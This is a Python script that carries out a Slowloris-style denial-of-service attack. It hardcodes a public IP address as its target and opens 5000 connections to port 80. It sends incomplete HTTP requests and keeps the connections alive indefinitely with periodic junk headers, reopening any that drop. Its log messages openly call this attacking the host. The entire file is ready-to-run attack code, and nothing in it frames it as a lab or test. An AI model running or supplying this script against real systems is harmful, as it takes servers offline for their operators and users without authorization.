import os
import socket
import time
import logging
import random

HOST = "52.30.3.239"
SOCKETS_COUNT = 5000
USER_AGENT = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"

def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 5000)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(USER_AGENT).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

    return s

def create_sockets():
    sockets = []

    logging.info("Attacking %s, sockets: %s", HOST, SOCKETS_COUNT)

    for _ in range(SOCKETS_COUNT):
        try:
            logging.debug("Creating socket... %s", _)
            s = init_socket()
        except socket.error as e:
            logging.info(e)
            break
        sockets.append(s)
    
    return sockets

def attack(sockets):
    while True:
        try:
            logging.info(
                "Sending keep-alive headers... Sockets count: %s", len(sockets)
            )
            
            for s in list(sockets):
                try:
                    s.send(
                        "X-req: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    sockets.remove(s)

            dead_sockets_count = SOCKETS_COUNT - len(sockets)

            for _ in range(dead_sockets_count):
                logging.info("Recreating sockets...")
                try:
                    s = init_socket()
                    if s:
                        sockets.append(s)
                except socket.error as e:
                    logging.info(e)
                    break
            logging.info("Sleeping for 10 seconds")
            time.sleep(10)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping....")
            break

if __name__ == "__main__":
    sockets = create_sockets()
    attack(sockets)